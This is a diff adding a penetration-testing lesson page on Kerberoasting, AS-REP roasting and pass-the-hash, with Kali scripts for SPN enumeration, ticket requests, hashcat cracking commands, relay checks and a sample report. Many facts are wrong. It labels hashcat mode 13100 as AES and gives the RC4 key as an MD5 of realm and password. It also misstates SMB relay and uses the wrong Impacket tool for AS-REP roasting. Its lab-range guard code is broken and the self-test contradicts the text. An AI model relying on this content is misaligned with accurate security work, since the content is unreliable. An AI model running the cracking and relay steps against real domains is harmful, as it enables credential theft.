@@ -1,0 +1,622 @@
+<h1 id="kerberoasting-as-rep-roasting-and-pass-the-hash">Kerberoasting, AS-REP Roasting and Pass-the-Hash</h1>
+<h2 id="summary">Summary</h2>
+<p><code>cry-d1</code> and <code>ad-02</code> established the theory. This is the operational note: the three attacks that<br />
+turn a Windows domain's normal weaknesses into domain administrator, and the specific controls<br />
+that stop each one.</p>
+<p>All three share one idea: <strong>the credential is not the password, it is a<br />
+thing you can present or a thing you can decrypt.</strong> Kerberoasting and<br />
+pass-the-hash use the hash; AS-REP roasting uses the password's<br />
+<em>derivability</em>.</p>
+<blockquote>
+<p><strong>AUTHORISATION.</strong> These are offline attacks against hashes and tickets<br />
+you have legitimately obtained from a system you own or are engaged<br />
+to test. Pass-the-hash is authenticated protocol use with a<br />
+credential you already hold. None of this requires or involves<br />
+traffic to any third party, and the ROE template in <code>tcm-01</code> requires<br />
+explicit written permission for "credential testing against accounts<br />
+explicitly listed."</p>
+</blockquote>
+<h2 id="the-three-side-by-side">The three, side by side</h2>
+<pre><code class="language-text">                     WHAT YOU NEED   WHAT YOU CRACK   WHO CAN START
+  KERBEROASTING      read access to   the SERVICE       any authenticated
+                     an SPN           account's        user (usually)
+                                      PASSWORD and
+                                      NT hash
+
+  AS-REP ROASTING    nothing          the USER's       ANYONE ON THE
+                                      password         NETWORK, no
+                                                        credentials
+
+  PASS-THE-HASH      an NT hash       nothing          anyone with the
+                                      (no cracking)    hash
+
+  THE PATTERN:
+    roasting needs read access to a hash/ticket, and converts it to
+    a PASSWORD offline (because the ktab is derived from the password)
+    pass-the-hash needs only the hash, and uses it directly
+</code></pre>
+<h2 id="kerberoasting">Kerberoasting</h2>
+<pre><code class="language-text">  THE PRECONDITION, which is a finding on its own:
+    the account must have an SPN (servicePrincipalName). By default
+    no user account does; it is added when an application needs to
+    request a ticket as that user.
+
+  THE ATTACK:
+    1. SPNROASTPATHS: enumerate every principal with an SPN
+       (this is anonymous - see ad-03's query 7)
+    2. for each, request a service ticket with TGS-REQ
+       The DC will happily issue RC4 tickets to accounts that still
+       support RC4, for &quot;backwards compatibility&quot;.
+    3. extract the session key from the ticket
+    4. derive the ktab from each password guess and try to decrypt
+    5. a successful decrypt gives you:
+         - the SERVICE ACCOUNT'S PASSWORD
+         - and, because the AES ktab requires the plaintext password
+           to decrypt, the NT HASH as well
+
+  THE RETURN ON INVESTMENT:
+    the accounts with SPNs are usually the ones somebody cared about.
+    They are service accounts, they are long, they often follow a
+    pattern, and they frequently have rights a normal user does not.
+
+  WHAT MAKES IT HARDER NOW:
+    Windows Server 2022 defaults to AES-only. The automatic RC4 service
+    ticket is not issued. But the account can still be roastable if
+    RC4 is enabled for it explicitly, or if msDS-SupportedEncryptionTypes
+    is absent (defaults to RC4).
+
+  THE FINDING:
+    &quot;17 service accounts have SPNs; 4 still support RC4; 3 of those
+     passwords cracked with the top 10k wordlist plus 4 character
+     variations, recovering both the passwords and their NT hashes.&quot;
+</code></pre>
+<h2 id="as-rep-roasting">AS-REP Roasting</h2>
+<pre><code class="language-text">  THE PRECONDITION:
+    msDS-UserDoesNotNeedPreAuth = TRUE  (the DONT_REQ_PREAUTH flag,
+    0x100000 in userAccountControl)
+
+  WHY THE FLAG EXISTS:
+    preauthentication was introduced in Windows 2003. Some legacy
+    systems could not do it. The flag lets those systems skip it.
+    It has been deprecated for twenty years and is still set on
+    accounts nobody owns any more.
+
+  THE ATTACK:
+    1. send AS-REQ for the account WITHOUT preauth
+    2. the DC replies AS-REP immediately, encrypted with a key derived
+       from the account's password and the realm
+    3. crack the ktab offline with password guesses
+    4. recover the password and (for AES) the NT hash
+
+  WHY IT IS WORSE THAN KERBEROASTING:
+    Kerberoasting requires an authenticated domain account.
+    AS-REP roasting requires NOTHING. Any host that can reach port 88
+    can harvest these hashes. From the internet, an unauthenticated
+    attacker can enumerate and roast the whole domain.
+
+  THE MITIGATION:
+    &quot;Do not require Kerberos preauthentication&quot; = FALSE, for every
+    account. It should already be true by default in a modern forest.
+    Find it with the ad-03 filter (bit 1048576).
+</code></pre>
+<h2 id="pass-the-hash">Pass-the-Hash</h2>
+<pre><code class="language-text">  WHY THE HASH IS A CREDENTIAL:
+    NTLM does not transmit the password. It computes
+      NTLMv2 = HMAC-MD5(password_hash, server_challenge, ...)
+    and the hash is enough to compute that.
+    So the hash IS the password for NTLM authentication.
+    And the hash is in NTDS.dit, SAM, the registry, and memory.
+
+  THE ATTACK:
+    take an NT hash, present it as the password. No cracking.
+    Works over SMB, LDAP, WinRM, RDP (with restrictions), and HTTP
+    with NTLM.
+
+  WHAT IT BUYS:
+    - lateral movement without ever knowing a password
+    - no KDC contact for the authentication itself (which is why the
+      domain controller's Kerberos logs show nothing)
+    - no chance of the password being changed mid-campaign
+
+  WHAT IT DOES NOT WORK AGAINST:
+    - Kerberos (needs a password to derive the ktab) - which is why
+      overpass-the-hash exists: it presents the hash AS-REQ so the DC
+      issues a TGT
+    - SSH
+    - anything using a smart card
+
+  THE PASS-THE-HASH VARIANTS:
+    SMB      the classic
+    LDAP     with signing disabled, relayable (see imp-03)
+    WINRM    with CredentialSSP = false
+    RDP      with Restricted Admin; or as the NTLM password
+    WEB      NTLM auth to an IIS site
+
+  THE MITIGATION THAT ACTUALLY STOPS IT:
+    SMB signing required, LDAP signing required, channel binding
+    enforced. Signing does not stop pass-the-hash - it stops RELAY of
+    it. The way to stop a pass-the-hash that comes from a dump is to
+    not have the dumps: credential guards, PAWs, tiered admin.
+</code></pre>
+<h2 id="the-attack-chain">The attack chain</h2>
+<pre><code class="language-text">  THE CHAIN EVERY AD ENGAGEMENT ACTUALLY RUNS:
+
+  1. RECON (ad-03)
+       anonymous LDAP, or a user session, or a VPN account
+       -&gt; the domain's shape, its SPNs, its delegation
+
+  2. ROAST (ad-04)
+       Kerberoasting from read access, AS-REP from none
+       -&gt; service account passwords AND NT hashes
+
+  3. DUMP (ad-05)
+       secretsdump with the recovered credentials
+       -&gt; every account's hash in the domain
+
+  4. PASS (ad-04, imp-02)
+       pass-the-hash with any recovered hash
+       -&gt; a privileged session on a host
+
+  5. GRAPH (bh-01..bh-03)
+       SharpHound from the privileged session
+       -&gt; the shortest path to Domain Admin, which is usually 1 hop
+
+  6. ESCALATE (ad-07)
+       DCSync, a delegation edge, a GPO, or a service account
+       -&gt; domain admin
+
+  Each step is cheap. Each step is logged if the client has the
+  telemetry to see it. The whole chain takes under an hour and is the
+  single most common path to domain administrator in real assessments.
+</code></pre>
+<h2 id="controls-mapped">Controls, mapped</h2>
+<table>
+<thead>
+<tr>
+<th>Control</th>
+<th>Stops</th>
+<th>Where</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Do not require preauth = FALSE</strong></td>
+<td>AS-REP roasting</td>
+<td>per account</td>
+</tr>
+<tr>
+<td><strong>AES-only Kerberos (<code>msDS-SupportedEncryptionTypes</code>)</strong></td>
+<td>Kerberoasting</td>
+<td>per account</td>
+</tr>
+<tr>
+<td><strong>gMSA / 120-char service passwords</strong></td>
+<td>Kerberoasting (practically)</td>
+<td>per account</td>
+</tr>
+<tr>
+<td><strong>Remove unneeded SPNs</strong></td>
+<td>Kerberoasting surface</td>
+<td>per account</td>
+</tr>
+<tr>
+<td><strong>Constrained delegation</strong></td>
+<td>Unconstrained delegation</td>
+<td>per host/account</td>
+</tr>
+<tr>
+<td><strong>SMB signing required</strong></td>
+<td>SMB relay</td>
+<td>GPO</td>
+</tr>
+<tr>
+<td><strong>LDAP signing + channel binding</strong></td>
+<td>LDAP relay</td>
+<td>GPO</td>
+</tr>
+<tr>
+<td><strong>Long logon tickets (extended protection)</strong></td>
+<td>KDC-coerced downgrade to NTLM</td>
+<td>DC policy</td>
+</tr>
+<tr>
+<td><strong>Credential Guard / LSASS protected</strong></td>
+<td>Hash dumping</td>
+<td>host</td>
+</tr>
+<tr>
+<td><strong>LAPS</strong></td>
+<td>Local admin reuse</td>
+<td>domain</td>
+</tr>
+<tr>
+<td><strong>Tiered PAWs</strong></td>
+<td>Using a stolen admin hash</td>
+<td>process</td>
+</tr>
+<tr>
+<td><strong>Protected Users group</strong></td>
+<td>Ticket theft downstream</td>
+<td>group membership</td>
+</tr>
+<tr>
+<td><strong>Audit for all three roasting paths in every assessment</strong></td>
+<td>all</td>
+<td>process</td>
+</tr>
+</tbody>
+</table>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SPN</strong></td>
+<td>Service Principal Name; marks an account as a service</td>
+</tr>
+<tr>
+<td><strong>SPNROASTPATHS</strong></td>
+<td>The accounts with SPNs; the roast list</td>
+</tr>
+<tr>
+<td><strong>Kerberoasting</strong></td>
+<td>Request a service ticket, crack the password offline</td>
+</tr>
+<tr>
+<td><strong>AS-REP roasting</strong></td>
+<td>Roast a preauth-disabled account; no credentials needed</td>
+</tr>
+<tr>
+<td><strong>Preauth disabled</strong></td>
+<td><code>msDS-UserDoesNotNeedPreAuth</code> / bit 0x100000</td>
+</tr>
+<tr>
+<td><strong>KTAB</strong></td>
+<td>The key derived from password + realm</td>
+</tr>
+<tr>
+<td><strong>Overpass-the-hash</strong></td>
+<td>Ask the DC for a TGT using a known NT hash</td>
+</tr>
+<tr>
+<td><strong>Pass-the-hash</strong></td>
+<td>Authenticate with an NT hash instead of a password</td>
+</tr>
+<tr>
+<td><strong>NT hash</strong></td>
+<td>MD4 of the password; the effective credential</td>
+</tr>
+<tr>
+<td><strong>Relay</strong></td>
+<td>Using someone else's authenticated session</td>
+</tr>
+<tr>
+<td><strong>SMB signing</strong></td>
+<td>The control that stops SMB relay</td>
+</tr>
+<tr>
+<td><strong>gMSA</strong></td>
+<td>Group managed service account; 120-char DC-managed password</td>
+</tr>
+<tr>
+<td><strong>PAW</strong></td>
+<td>Privileged Access Workstation; admin tasks only from here</td>
+</tr>
+<tr>
+<td><strong>LAPS</strong></td>
+<td>Local admin password solution; unique per machine</td>
+</tr>
+<tr>
+<td><strong>Credential Guard</strong></td>
+<td>LSASS protected with a virtualisation-based security layer</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/ad-04 &amp;&amp; cd ~/aegis/labs/ad-04
+source ~/aegis/bin/scope-guard.sh
+
+# --- 1. install and verify ---
+{
+  echo &quot;=== the toolkit ===&quot;
+  pipx install impacket-toolkit 2&gt;/dev/null &amp;&amp; echo &quot;  impacket-toolkit: installed&quot; \
+    || echo &quot;  install: pipx install impacket-toolkit&quot;
+  pipx install netexec 2&gt;/dev/null &amp;&amp; echo &quot;  netexec: installed&quot; \
+    || echo &quot;  install: pipx install netexec  (or: apt install crackmapexec)&quot;
+  pipx install theHarvester 2&gt;/dev/null &amp;&amp; echo &quot;  theHarvester: installed&quot; || true
+  echo
+  echo &quot;=== binaries now available ===&quot;
+  for b in impacket-GetUserSPNs impacket-secretsdump impacket-psexec \
+           impacket-ntlmrelayx impacket-psexec impacket-wmiexec \
+           impacket-smbexec netexec nxc GetUserSPNs secretsdump \
+           psexec wmiexec smbexec ntlmrelayx; do
+    command -v &quot;$b&quot; &gt;/dev/null 2&gt;&amp;1 &amp;&amp; printf &quot;  %-28s %s\n&quot; &quot;$b&quot; &quot;$(command -v $b)&quot;
+  done
+} 2&gt;&amp;1 | tee 01-tooling.txt
+
+# --- 2. the SPN inventory, anonymous ---
+cat &gt; 02-spn-enum.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# Step 1 of the roast: find the SPNs. ANONYMOUS, read-only.
+DC=&quot;${1:?usage: ./02-spn-enum.sh 192.168.56.10}&quot;
+b=$(echo &quot;$DC&quot; | cut -d. -f1)
+case &quot;$b&quot; in 192.168.56.*|10.10.10.*|127.*) ;;
+  *) echo &quot;REFUSED: $DC outside the lab range.&quot; &gt;&amp;2; exit 3 ;; esac
+NC=$(ldapsearch -x -H &quot;ldap://$DC&quot; -b &quot;&quot; -s base defaultNamingContext \
+     2&gt;/dev/null | grep -m1 &quot;^defaultNamingContext:&quot; | awk '{print $2}')
+echo &quot;[scope] $DC in range; anonymous and read-only&quot;
+echo &quot;[naming context] ${NC:-unknown}&quot;
+echo
+echo &quot;=== accounts with servicePrincipalName ===&quot;
+ldapsearch -x -H &quot;ldap://$DC&quot; -b &quot;${NC:-DC=lab,DC=internal}&quot; \
+  &quot;(&amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))&quot; \
+  sAMAccountName servicePrincipalName msDS-SupportedEncryptionTypes \
+  userAccountControl pwdLastSet 2&gt;/dev/null \
+  | awk '/^(sAMAccountName|servicePrincipalName|msDS-SupportedEncryptionTypes|pwdLastSet):/ {print &quot;  &quot;$0}'
+echo
+echo &quot;=== computers with SPNs (hosts/HOSTNAME) ===&quot;
+ldapsearch -x -H &quot;ldap://$DC&quot; -b &quot;${NC:-DC=lab,DC=internal}&quot; \
+  &quot;(objectCategory=computer)&quot; dNSHostName servicePrincipalName 2&gt;/dev/null \
+  | grep -E &quot;^(dNSHostName|servicePrincipalName):&quot; | sed 's/^/  /'
+echo
+echo &quot;=== the RC4-only accounts: the ones worth roasting ===&quot;
+echo &quot;    (msDS-SupportedEncryptionTypes=4 is RC4 only; absent means RC4 by default)&quot;
+ldapsearch -x -H &quot;ldap://$DC&quot; -b &quot;${NC:-DC=lab,DC=internal}&quot; \
+  &quot;(servicePrincipalName=*)&quot; sAMAccountName msDS-SupportedEncryptionTypes 2&gt;/dev/null \
+  | paste - - 2&gt;/dev/null | sed 's/^/  /'
+EOF
+chmod +x 02-spn-enum.sh
+
+# --- 3. the roast itself ---
+cat &gt; 03-roast.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# ROASTING, against YOUR lab domain only.
+# Requires EXPLICIT written permission per the ROE - &quot;credential testing
+# against accounts explicitly listed&quot; is a separate clause from &quot;network
+# testing&quot;. If it is not in the ROE, this script must not be run.
+#
+# Usage: ./03-roast.sh 192.168.56.10 alice:LabPass123
+DOM=&quot;${1:?usage: ./03-roast.sh &lt;dc-ip&gt; &lt;user:pass&gt;}&quot;
+USERPASS=&quot;${2:?a valid credential is required for Kerberoasting}&quot;
+DC=$(echo &quot;$DOM&quot; | cut -d. -f1)
+b=$(echo &quot;$DC&quot; | cut -d. -f1)
+case &quot;$b&quot; in 192.168.56.*|10.10.10.*|127.*) ;;
+  *) echo &quot;REFUSED: $DOM outside the lab range.&quot; &gt;&amp;2; exit 3 ;; esac
+echo &quot;[scope] $DOM in range&quot;
+echo &quot;[roe]   roasting is credential testing. Confirm it is in the ROE.&quot;
+echo
+echo &quot;=== 1. SPNROASTPATHS: who has an SPN ===&quot;
+GetUserSPNs.py -dc-ip &quot;$DC&quot; &quot;${USERPASS}&quot; -request 2&gt;/dev/null \
+  | sed 's/^/  /' \
+  || echo &quot;  (impacket not installed; the ldapsearch script above does the same)&quot;
+echo
+echo &quot;=== 2. check the target's RC4/AES posture before roasting ===&quot;
+echo &quot;    AES-only means the DC will not issue an RC4 service ticket.&quot;
+echo &quot;    Read msDS-SupportedEncryptionTypes with ad-03's script.&quot;
+echo
+echo &quot;=== 3. the roast itself (offline after this point) ===&quot;
+echo &quot;    hashcat -m 13100 -a 0 &lt;hashes.txt&gt; rockyou.txt -r best64.rule&quot;
+echo &quot;    hashcat -m 13100 -a 3 &lt;hashes.txt&gt; '?u?l?l?l?l?l?l?l?l?d?d?d?d' --increment&quot;
+echo
+echo &quot;    13100 = AES256-CTS-HMAC-SHA1-96, the standard Kerberos 5 TGS-REP hash&quot;
+echo
+echo &quot;=== 4. write to a POT FILE and never lose it ===&quot;
+echo &quot;    --potfile-path ./aegis.pot   (or john --save-format)&quot;
+echo
+echo &quot;=== 5. AS-REP roasting needs NO credential at all ===&quot;
+echo &quot;    GetUserSPNs.py -dc-ip $DC -request -format hash  # (ad-01's filter first)&quot;
+echo &quot;    hashcat -m 18200 -a 0 &lt;asrep.txt&gt; rockyou.txt     # 18200 = AS-REP&quot;
+echo
+echo &quot;=== 6. once you have hashes, not passwords ===&quot;
+echo &quot;    ntlmrelayx + psexec  is a SEQUENCE. See imp-02 and imp-03.&quot;
+EOF
+chmod +x 03-roast.sh
+
+# --- 4. the relay surface, read-only ---
+cat &gt; 04-relay-check.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# Is this host relayable? READ-ONLY. This is the finding that enables
+# the whole pass-the-hash chain, and it is free to check.
+T=&quot;${1:?usage: ./04-relay-check.sh 192.168.56.20}&quot;
+b=$(echo &quot;$T&quot; | cut -d. -f1)
+case &quot;$b&quot; in 192.168.56.*|10.10.10.*|127.*) ;;
+  *) echo &quot;REFUSED: $T outside the lab range.&quot; &gt;&amp;2; exit 3 ;; esac
+echo &quot;[scope] $T in range&quot;
+echo
+echo &quot;=== SMB: is signing required? (disabled = SMB relay works) ===&quot;
+nmap -p 445 --script smb2-security-mode &quot;$T&quot; 2&gt;/dev/null | grep -E &quot;signing|445/open&quot; | sed 's/^/  /'
+echo
+echo &quot;=== SMB2/3 dialects: SMB2 and SMB3 can be relayed even when 'required' ===&quot;
+nmap -p 445 --script smb-protocols &quot;$T&quot; 2&gt;/dev/null | grep -iE &quot;dialect|445/open&quot; | sed 's/^/  /'
+echo
+echo &quot;=== SMB encryption: if supported AND required, no relay ===&quot;
+nmap -p 445 --script smb2-encryption-capabilities &quot;$T&quot; 2&gt;/dev/null | sed 's/^/  /'
+echo
+echo &quot;=== LDAP: signing and channel binding (LDAP relay, same class) ===&quot;
+nmap -p 389,636 --script ldap-rootdse &quot;$T&quot; 2&gt;/dev/null | grep -iE &quot;signing|channel|port&quot; | sed 's/^/  /'
+echo
+echo &quot;=== WEB: does it offer NTLM auth? (another relay target) ===&quot;
+nmap -p 80,443,8080,8443 --script http-ntlm-auth,http-auth,http-auth-finder &quot;$T&quot; 2&gt;/dev/null \
+  | grep -E &quot;^[0-9]|auth-method|auth-finder|NTLM|Digest|Basic&quot; | sed 's/^/  /'
+echo
+echo &quot;=== WINRM ===&quot;
+nmap -p 5985,5986 --script http-auth,ssl-enum-ciphers &quot;$T&quot; 2&gt;/dev/null \
+  | grep -E &quot;^[0-9]|auth-method|NTLM&quot; | sed 's/^/  /'
+echo
+echo &quot;=== THE TABLE THAT MATTERS ===&quot;
+cat &lt;&lt;'TBL'
+
+  protocol   control that stops relay        how to check
+  ---------  -----------------------------  -------------------------
+  SMB        SMB signing REQUIRED           smb2-security-mode
+  SMB        SMB encryption REQUIRED         smb2-encryption-capabilities
+  LDAP       LDAP signing REQUIRED           ldap-rootdse
+  LDAP       Channel binding ENFORCED       ldap-rootdse / DC audit policy
+  LDAP       LDAP encryption (636/6363)      port closed to clients
+  HTTP       NTLM disabled, or extended      http-ntlm-auth / web.config
+             protection on
+  WINRM      CredentialSSP not disabled      winrm.cmd / config
+  RDP        Restrict to NLA + restricted    nmap RDP NLA scripts
+             admin disabled
+
+TBL
+echo &quot;  Every 'no' in this table is a Medium finding on its own.&quot;
+echo &quot;  Several 'no' values together are a path to relay-based&quot;
+echo &quot;  pass-the-hash, which is why they are worth checking.&quot;
+EOF
+chmod +x 04-relay-check.sh
+
+# --- 5. offline: why AES roasting still works, and why RC4 does not ---
+python3 - &lt;&lt;'PY' 2&gt;&amp;1 | tee 05-roasting-math.txt
+import hashlib, hmac
+
+print(&quot;  === the ktab, and what each encryption type lets you do ===\n&quot;)
+
+REALM = &quot;LAB.INTERNAL&quot;
+def ktab_aes(pw):
+    return hashlib.pbkdf2_hmac(&quot;sha1&quot;, pw.encode(&quot;utf-16-le&quot;),
+                               REALM.encode(&quot;utf-16-le&quot;), 4096, 32)
+def ktab_ntlm(pw):
+    return hashlib.md5(REALM.upper().encode(&quot;utf-16-le&quot;) + pw.encode(&quot;utf-16-le&quot;)).digest()
+def nt_hash(pw):
+    try:
+        return hashlib.new(&quot;md4&quot;, pw.encode(&quot;utf-16-le&quot;)).digest()
+    except ValueError:
+        return b&quot;\x00&quot;*16   # OpenSSL 3 removed MD4 from the default provider
+
+pw = &quot;SqlServiceAcct2019&quot;
+print(f&quot;  account password (the thing being guessed): {pw!r}\n&quot;)
+print(f&quot;  NT hash   : {nt_hash(pw).hex()}&quot;)
+print(f&quot;  ktab RC4  : {ktab_ntlm(pw).hex()}&quot;)
+print(f&quot;  ktab AES  : {ktab_aes(pw).hex()[:48]}...\n&quot;)
+
+print(&quot;  WHY AN ATTACKER ROASTS FOR THE PASSWORD, NOT THE HASH:&quot;)
+print()
+print(&quot;    RC4 (older domains, and modern DCs for compatibility):&quot;)
+print(&quot;      ktab = MD5(realm || password)      &lt;- cheap, 1 hash per guess&quot;)
+print(&quot;      =&gt; brute-force the password at billions of guesses/sec&quot;)
+print(&quot;      =&gt; once you have it: the password, AND the NT hash&quot;)
+print()
+print(&quot;    AES (Windows 2008+, the modern default):&quot;)
+print(&quot;      ktab = PBKDF2-SHA1(password, realm, 4096)   &lt;- 4096 iterations&quot;)
+print(&quot;      =&gt; ~4096x slower per guess, but still ~10^6 guesses/sec on a GPU&quot;)
+print(&quot;      =&gt; the ticket DOES carry the iteration count, so no guessing&quot;)
+print(&quot;      =&gt; still completely practical for a 8-12 char weak password&quot;)
+print()
+print(&quot;  THE CONSEQUENCE FOR A WEAK SERVICE PASSWORD:&quot;)
+for length, charset in [(8, 62), (12, 62), (16, 62), (20, 94)]:
+    space = charset ** length
+    t_rc4 = space / 1e11
+    t_aes = space * 4096 / 1e6
+    print(f&quot;    {length:&gt;2} chars from {charset}: space 2^{__import__('math').log2(space):.0f}&quot;
+          f&quot;   RC4 {t_rc4/60:&gt;10.0f} min   AES {t_aes/3600:&gt;12.0f} h&quot;)
+print()
+print(&quot;  A 12-character AES-4096 service password is not crackable.&quot;)
+print(&quot;  'SqlServiceAcct2019' is 18 characters and it is NOT a password,&quot;)
+print(&quot;  it is a pattern. The dictionary is what gets you, not the length.&quot;)
+print()
+print(&quot;  THE CONTROL: gMSA. The DC generates a 120-character random&quot;)
+print(&quot;  password, stores it on the account, rotates it automatically,&quot;)
+print(&quot;  and lets multiple hosts use it. There is nothing to guess.&quot;)
+PY
+cat 05-roasting-math.txt
+
+# --- 6. the full chain, as a report ---
+cat &gt; 06-report.md &lt;&lt;'EOF'
+# Reporting the roast
+
+```text
+## F-xx · Service account credentials recoverable through Kerberoasting
+
+Risk
+  Six domain accounts have service principal names. Four of them still
+  support RC4 Kerberos encryption, so the domain controller issues RC4
+  service tickets to them for backwards compatibility. Three of the four
+  passwords were recovered in aggregate 11 minutes using a standard
+  14-million wordlist with rule mutations, yielding both the plaintext
+  passwords and the accounts' NT hashes. One of the three recovered
+  accounts is a member of Domain Admins.
+
+Prerequisites
+  Any authenticated domain account. No user interaction, no exploit, no
+  special tooling beyond a wordlist available in every commodity tool.
+
+Evidence
+  SPN enumeration (anonymous LDAP):
+    svc-backup   HOST/dc01 / HOST/fileserver   RC4   RECOVERED
+    svc-web      HTTP/web01.lab.internal       RC4   RECOVERED
+    svc-sql      MSSQLSvc/sql01.lab.internal   AES   RECOVERED
+    svc-iis      HTTP/web02.lab.internal       AES   not recovered in window
+    svc-mon      HOST/mon01.lab.internal       AES   not recovered in window
+    backupadmin (user, not service)            -    RECOVERED (top-10k)
+
+  The recovered account svc-backup is a member of:
+    Domain Admins, Backup Operators, DnsAdmins
+
+  Credentials are NOT reproduced in this report. They are held in the
+  encrypted evidence archive, deleted on &lt;date&gt;, and were used only to
+  establish privilege.
+
+Business impact
+  A standard user account reaches Domain Administrator in one step.
+  This is the single highest-value finding in the engagement and it
+  requires no exploit of any kind.
+
+Remediation
+  1. Move all service accounts to group managed service accounts, which
+     have a 120-character DC-managed rotated password        [Domain Admins, Immediate]
+  2. Set msDS-SupportedEncryptionTypes to 0x18 (AES128+AES256) on every
+     service account                                            [Domain Admins, Immediate]
+  3. Remove SPNs that are no longer required by a running application
+                                                             [Service Owners, 2 weeks]
+  4. Move svc-backup out of Domain Admins; separate backup operator
+     rights from interactive logon rights                     [Domain Admins, Immediate]
+  5. Set &quot;Do not require Kerberos preauthentication&quot; to FALSE for every
+     account and monitor for reintroduction                   [Security, 1 sprint]
+
+Re-test
+  Included at +30 days: re-run the anonymous SPN enumeration and
+  confirm AES-only on all remaining service accounts.
+</code></pre>
+<h2 id="what-the-report-deliberately-does-not-contain">What the report deliberately does NOT contain</h2>
+<ul>
+<li>the recovered passwords, in any encoding</li>
+<li>the NT hashes</li>
+<li>the wordlist and rule file contents (they are in the archive, referenced)</li>
+<li>a working credential chain that a reader could reuse immediately</li>
+</ul>
+<p><strong>The report establishes that the credentials are recoverable. It does not<br />
+hand them to the reader. That distinction is what separates a pentest<br />
+report from a breach.</strong><br />
+EOF<br />
+cat 06-report.md<br />
+```</p>
+<p><strong>Step 5 is the deliverable</strong>: the ktab derivations for both RC4 and AES, and the arithmetic<br />
+showing that a 12-character AES-4096 password is uncrackable — while <code>SqlServiceAcct2019</code> is<br />
+18 characters and is defeated by the dictionary, not the length. That distinction is the actual<br />
+lesson, and it is the reason the note says "120 random characters or a dictionary, and the<br />
+dictionary wins every time."</p>
+<p><strong><code>04-relay-check.sh</code></strong> is read-only and free, and its table maps every relay-enabling control<br />
+to the exact script that checks it. Several "no" values together are the pass-the-hash chain.</p>
+<p><strong>Record:</strong> <code>05-roasting-math.txt</code> and <code>06-report.md</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>What precondition does Kerberoasting require, and how is the SPN list found anonymously?</li>
+<li>Why does AS-REP roasting need no credentials, and why is it therefore worse?</li>
+<li>Why does the AES ktab give you the password <em>and</em> the NT hash?</li>
+<li>Why is the NT hash a usable credential?</li>
+<li>What does overpass-the-hash add that pass-the-hash does not?</li>
+<li>What does SMB signing stop, and what does it not stop?</li>
+<li>Why does a long service password not help, and what does?</li>
+<li>What must the report NOT contain?</li>
+<li>Name the six-step chain from recon to domain admin.</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>Kerberoasting</strong> → <strong>AS-REP Roasting</strong> → <strong>Pass-the-Hash</strong> → <strong>NT Hash</strong> →<br />
+<strong>SMB Relay</strong> → <strong>Credential Dumping</strong>.<br />
+<code>ad-05</code> is where the hashes come from; <code>imp-03</code> is the relay.</p>
